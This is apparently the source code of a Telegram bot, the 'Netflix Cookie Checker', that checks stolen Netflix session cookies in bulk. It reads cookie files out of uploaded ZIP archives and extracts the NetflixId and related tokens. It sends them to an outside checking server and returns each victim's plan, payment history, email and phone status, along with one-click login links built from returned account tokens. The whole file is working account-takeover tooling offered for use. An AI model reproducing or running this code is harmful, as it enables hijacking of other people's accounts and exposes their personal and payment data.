import os
import re
import json
import zipfile
import requests
import tempfile
import threading
from flask import Flask
from telegram.ext import Updater, MessageHandler, CommandHandler, CallbackQueryHandler, Filters
from telegram import ParseMode, InlineKeyboardButton, InlineKeyboardMarkup
import time, logging, threading, requests
logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# Flask app to keep port open on Render
flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "Bot is running!"

def run_flask():
    flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))

# Start Flask in background thread
threading.Thread(target=run_flask, daemon=True).start()

BOT_TOKEN = os.environ["BOT_TOKEN"]
SCRAPE_URL = "https://netflix-checker-3pev.onrender.com/scrape"
WAKE_URL = "https://netflix-checker-3pev.onrender.com/withdraw?cookie=test"

COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"]

# Store pending sessions
pending_sessions = {}

def wake_up_server(retries=6):
    for i in range(retries):
        try:
            r = requests.get(WAKE_URL, timeout=100)
            log.info(f"Wake attempt {i+1}: status {r.status_code}")
            if r.status_code != 429:
                return True
            log.warning("Got 429 (still spinning up), retrying...")
            time.sleep(10)
        except Exception as e:
            log.warning(f"Wake attempt {i+1} failed: {e}")
            time.sleep(10)
    return False

# 1) Wake it when the bot script starts
threading.Thread(target=wake_up_server, daemon=True).start()

def extract_cookie_from_text(text):
    for line in text.splitlines():
        if "NetflixId" in line and "\t" in line:
            parts = line.split("\t")
            for i, part in enumerate(parts):
                if part.strip() == "NetflixId":
                    if i + 1 < len(parts):
                        value = parts[i + 1].strip()
                        if value:
                            cookie_str = f"NetflixId={value}"
                            for line2 in text.splitlines():
                                if "SecureNetflixId" in line2 and "\t" in line2:
                                    parts2 = line2.split("\t")
                                    for j, p in enumerate(parts2):
                                        if p.strip() == "SecureNetflixId":
                                            if j + 1 < len(parts2):
                                                cookie_str += f"; SecureNetflixId={parts2[j+1].strip()}"
                                            break
                            for line3 in text.splitlines():
                                if "nfvdid" in line3 and "\t" in line3:
                                    parts3 = line3.split("\t")
                                    for k, p in enumerate(parts3):
                                        if p.strip() == "nfvdid":
                                            if k + 1 < len(parts3):
                                                cookie_str += f"; nfvdid={parts3[k+1].strip()}"
                                            break
                            return cookie_str
    return ""

def parse_filename(filename):
    """Parse filename like [Premium] [1 payments] [extra false] [IN] [email@gmail.com]"""
    info = {
        "plan": None,
        "payments": None,
        "country": None,
        "skip": False
    }

    # Extract all bracket contents
    brackets = re.findall(r'\[([^\]]+)\]', filename)

    if not brackets:
        # Random filename like 123456.txt - don't skip
        return info

    for b in brackets:
        b_lower = b.lower()

        # Payment count
        payment_match = re.search(r'(\d+)\s*payment', b_lower)
        if payment_match:
            info["payments"] = int(payment_match.group(1))

        # Plan
        if b_lower in ["premium", "standard", "basic", "mobile", "standard with ads"]:
            info["plan"] = b.lower()

        # Country code (2 letter uppercase)
        if re.match(r'^[A-Z]{2}$', b):
            info["country"] = b

    # Skip if 0 payments
    if info["payments"] is not None and info["payments"] == 0:
        info["skip"] = True

    return info

def check_cookie(cookie_raw):
    try:
        response = requests.get(
            SCRAPE_URL,
            params={"cookie": cookie_raw},
            timeout=120
        )
        return response.json()
    except Exception as e:
        return {"error": str(e)}

def format_result(d, index, total, filename):
    base = "https://www.netflix.com"
    token = d.get("token", "")

    msg = (
        f"🎬 <b>NETFLIX ACCOUNT {index}/{total}</b> 🎬\n"
        f"📄 <code>{filename}</code>\n\n"
        f"🔴 <b>Status:</b> {d.get('status', 'Unknown')}\n"
        f"🌍 <b>Region:</b> {d.get('country', 'Unknown')}\n"
        f"🕐 <b>Member Since:</b> {d.get('member_since', 'Unknown')}\n"
        f"👑 <b>Plan:</b> {d.get('plan', 'Unknown')}\n"
        f"💳 <b>Payment:</b> {d.get('payment', 'Unknown')}\n"
        f"📧 <b>Email:</b> {d.get('email', 'Unknown')}\n"
        f"   {d.get('email_verified', 'Unknown')}\n"
        f"📱 <b>Phone:</b> {d.get('phone_verified', 'Unknown')}\n"
        f"👥 <b>Extra Members:</b> {d.get('extra_members', 'Unknown')}\n"
        f"🎭 <b>Profiles:</b> {d.get('profiles', 'Unknown')}\n"
        f"💰 <b>Last 3 Payments:</b> {d.get('payment_history', 'Unknown')}\n\n"
        f"⏰ <b>Expires:</b> {d.get('expires', 'Unknown')}"
    )

    buttons = None
    if token:
        buttons = InlineKeyboardMarkup([[
            InlineKeyboardButton("🖥 PC", url=f"{base}/account?nftoken={token}"),
            InlineKeyboardButton("📱 MOBILE", url=f"{base}/unsupported?nftoken={token}"),
            InlineKeyboardButton("📺 TV", url=f"{base}/tv9?nftoken={token}")
        ]])

    return msg, buttons

def process_files(context, chat_id, progress_msg, files_to_check):
    total = len(files_to_check)
    active = 0
    expired = 0
    errors = 0

    for i, (txt_path, filename) in enumerate(files_to_check, 1):
        try:
            with open(txt_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read().strip()

            if not content:
                errors += 1
                continue

            cookie_raw = extract_cookie_from_text(content)

            if not cookie_raw:
                errors += 1
                context.bot.send_message(
                    chat_id=chat_id,
                    text=f"⚠️ <b>{i}/{total}</b> - <code>{filename}</code>\nCould not extract cookie",
                    parse_mode=ParseMode.HTML
                )
                continue

            if i % 5 == 0 or i == 1:
                try:
                    context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=f"⏳ Checking <b>{i}/{total}</b>...\n✅ Active: {active} | ❌ Expired: {expired} | ⚠️ Errors: {errors}",
                        parse_mode=ParseMode.HTML
                    )
                except:
                    pass

            result = check_cookie(cookie_raw)

            if "error" in result:
                errors += 1
                context.bot.send_message(
                    chat_id=chat_id,
                    text=f"❌ <b>{i}/{total}</b> - <code>{filename}</code>\nError: {result['error']}",
                    parse_mode=ParseMode.HTML
                )
                continue

            status = result.get("status", "")
            if "Active" in status:
                active += 1
            else:
                expired += 1

            msg, buttons = format_result(result, i, total, filename)
            context.bot.send_message(
                chat_id=chat_id,
                text=msg,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=buttons
            )

        except Exception as e:
            errors += 1
            continue

    try:
        context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=progress_msg.message_id,
            text=(
                f"✅ <b>Checking Complete!</b>\n\n"
                f"📊 <b>Summary:</b>\n"
                f"✅ Active: <b>{active}</b>\n"
                f"❌ Expired: <b>{expired}</b>\n"
                f"⚠️ Errors: <b>{errors}</b>\n"
                f"📦 Total: <b>{total}</b>"
            ),
            parse_mode=ParseMode.HTML
        )
    except:
        pass

def handle_start(update, context):
    update.message.reply_text(
        "👋 <b>Netflix Cookie CheckerV512 Bot</b>\n\n"
        "📦 Just send me a <b>ZIP file</b> containing Netflix cookie .txt files\n"
        "I will check each account automatically!\n\n"
        "✅ Shows: Status, Plan, Payment, Email, Profiles and more!",
        parse_mode=ParseMode.HTML
    )

def handle_document(update, context):
    doc = update.message.document

    if not doc.file_name.lower().endswith(".zip"):
        return

    chat_id = update.message.chat_id

    # Wake up server
    wake_msg = context.bot.send_message(
        chat_id=chat_id,
        text="⏳ <b>Waking up server...</b>\nPlease wait 30-60 seconds...",
        parse_mode=ParseMode.HTML
    )

    wake_up_server()

    context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=wake_msg.message_id,
        text="✅ <b>Server is awake!</b>\n📦 Downloading ZIP...",
        parse_mode=ParseMode.HTML
    )

    try:
        file = context.bot.get_file(doc.file_id)
        tmpdir = tempfile.mkdtemp()
        zip_path = os.path.join(tmpdir, "cookies.zip")
        file.download(zip_path)

        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(tmpdir)

        # Find all txt files
        all_files = []
        for root, dirs, files in os.walk(tmpdir):
            for f in files:
                if f.lower().endswith(".txt"):
                    all_files.append((os.path.join(root, f), f))

        # Filter files
        valid_files = []
        skipped = 0
        plans_found = set()
        countries_found = set()

        for txt_path, filename in all_files:
            info = parse_filename(filename)
            if info["skip"]:
                skipped += 1
                continue
            valid_files.append((txt_path, filename, info))
            if info["plan"]:
                plans_found.add(info["plan"])
            if info["country"]:
                countries_found.add(info["country"])

        total_valid = len(valid_files)

        if total_valid == 0:
            context.bot.send_message(
                chat_id=chat_id,
                text=f"❌ No valid cookies found!\n⏭ Skipped {skipped} files with 0 payments.",
                parse_mode=ParseMode.HTML
            )
            return

        # Store session data
        pending_sessions[chat_id] = {
            "valid_files": valid_files,
            "tmpdir": tmpdir,
            "skipped": skipped,
            "plans": list(plans_found),
            "countries": list(countries_found)
        }

        # Show summary and ask filter
        plans_str = ", ".join([p.title() for p in plans_found]) if plans_found else "Mixed"
        countries_str = ", ".join(countries_found) if countries_found else "Mixed"

        summary = (
            f"📊 <b>ZIP Summary:</b>\n\n"
            f"✅ Valid files: <b>{total_valid}</b>\n"
            f"⏭ Skipped (0 payments): <b>{skipped}</b>\n"
            f"👑 Plans: <b>{plans_str}</b>\n"
            f"🌍 Countries: <b>{countries_str}</b>\n\n"
            f"Do you want to filter by Plan/Country?"
        )

        buttons = InlineKeyboardMarkup([[
            InlineKeyboardButton("✅ Yes, Filter", callback_data=f"filter_yes_{chat_id}"),
            InlineKeyboardButton("❌ No, Check All", callback_data=f"filter_no_{chat_id}")
        ]])

        context.bot.send_message(
            chat_id=chat_id,
            text=summary,
            parse_mode=ParseMode.HTML,
            reply_markup=buttons
        )

    except zipfile.BadZipFile:
        context.bot.send_message(
            chat_id=chat_id,
            text="❌ Invalid ZIP file!",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ Error: {str(e)}",
            parse_mode=ParseMode.HTML
        )

def handle_callback(update, context):
    query = update.callback_query
    query.answer()
    chat_id = query.message.chat_id
    data = query.data

    session = pending_sessions.get(chat_id)
    if not session:
        query.edit_message_text("❌ Session expired. Please send ZIP again.")
        return

    # No filter - check all
    if data.startswith("filter_no_"):
        files_to_check = [(f[0], f[1]) for f in session["valid_files"]]
        query.edit_message_text(
            f"✅ Checking all <b>{len(files_to_check)}</b> cookies...",
            parse_mode=ParseMode.HTML
        )
        progress_msg = context.bot.send_message(
            chat_id=chat_id,
            text="⏳ Starting...",
            parse_mode=ParseMode.HTML
        )
        process_files(context, chat_id, progress_msg, files_to_check)

    # Yes filter - show plans
    elif data.startswith("filter_yes_"):
        plans = session.get("plans", [])
        if not plans:
            query.edit_message_text("No plan info found in filenames. Checking all...")
            files_to_check = [(f[0], f[1]) for f in session["valid_files"]]
            progress_msg = context.bot.send_message(
                chat_id=chat_id,
                text="⏳ Starting...",
                parse_mode=ParseMode.HTML
            )
            process_files(context, chat_id, progress_msg, files_to_check)
            return

        buttons = []
        row = []
        for plan in plans:
            row.append(InlineKeyboardButton(plan.title(), callback_data=f"plan_{plan}_{chat_id}"))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([InlineKeyboardButton("👑 All Plans", callback_data=f"plan_all_{chat_id}")])

        query.edit_message_text(
            "👑 <b>Select Plan:</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(buttons)
        )

    # Plan selected - show countries
    elif data.startswith("plan_"):
        parts = data.split("_")
        plan = parts[1]
        session["selected_plan"] = plan

        countries = session.get("countries", [])
        if not countries:
            # No country info - proceed to check
            files_to_check = filter_files(session, plan, None)
            query.edit_message_text(
                f"✅ Checking <b>{len(files_to_check)}</b> cookies with plan: <b>{plan.title()}</b>...",
                parse_mode=ParseMode.HTML
            )
            progress_msg = context.bot.send_message(
                chat_id=chat_id,
                text="⏳ Starting...",
                parse_mode=ParseMode.HTML
            )
            process_files(context, chat_id, progress_msg, files_to_check)
            return

        buttons = []
        row = []
        for country in sorted(countries):
            row.append(InlineKeyboardButton(country, callback_data=f"country_{country}_{chat_id}"))
            if len(row) == 4:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([InlineKeyboardButton("🌍 All Countries", callback_data=f"country_all_{chat_id}")])

        query.edit_message_text(
            f"🌍 <b>Select Country</b> (Plan: {plan.title()}):\n\nOr type country codes like: IN,US,GB",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(buttons)
        )

    # Country selected - start checking
    elif data.startswith("country_"):
        parts = data.split("_")
        country = parts[1]
        plan = session.get("selected_plan", "all")

        files_to_check = filter_files(session, plan, country)

        query.edit_message_text(
            f"✅ Checking <b>{len(files_to_check)}</b> cookies\n"
            f"👑 Plan: <b>{plan.title()}</b>\n"
            f"🌍 Country: <b>{country.upper()}</b>",
            parse_mode=ParseMode.HTML
        )
        progress_msg = context.bot.send_message(
            chat_id=chat_id,
            text="⏳ Starting...",
            parse_mode=ParseMode.HTML
        )
        process_files(context, chat_id, progress_msg, files_to_check)

def filter_files(session, plan, country):
    valid_files = session["valid_files"]
    result = []
    for txt_path, filename, info in valid_files:
        if plan != "all" and info["plan"] and info["plan"] != plan:
            continue
        if country and country != "all" and info["country"] and info["country"] != country:
            continue
        result.append((txt_path, filename))
    return result

def handle_message(update, context):
    # Handle country code text input after plan selection
    chat_id = update.message.chat_id
    session = pending_sessions.get(chat_id)
    if not session or "selected_plan" not in session:
        return

    text = update.message.text.strip().upper()
    countries_input = [c.strip() for c in text.split(",")]

    plan = session.get("selected_plan", "all")
    files_to_check = []
    for txt_path, filename, info in session["valid_files"]:
        if plan != "all" and info["plan"] and info["plan"] != plan:
            continue
        if info["country"] in countries_input or not countries_input:
            files_to_check.append((txt_path, filename))

    update.message.reply_text(
        f"✅ Checking <b>{len(files_to_check)}</b> cookies\n"
        f"👑 Plan: <b>{plan.title()}</b>\n"
        f"🌍 Countries: <b>{', '.join(countries_input)}</b>",
        parse_mode=ParseMode.HTML
    )
    progress_msg = context.bot.send_message(
        chat_id=chat_id,
        text="⏳ Starting...",
        parse_mode=ParseMode.HTML
    )
    process_files(context, chat_id, progress_msg, files_to_check)

updater = Updater(token=BOT_TOKEN)
dp = updater.dispatcher
dp.add_handler(CommandHandler("start", handle_start))
dp.add_handler(MessageHandler(Filters.document, handle_document))
dp.add_handler(CallbackQueryHandler(handle_callback))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
updater.start_polling()
updater.idle()
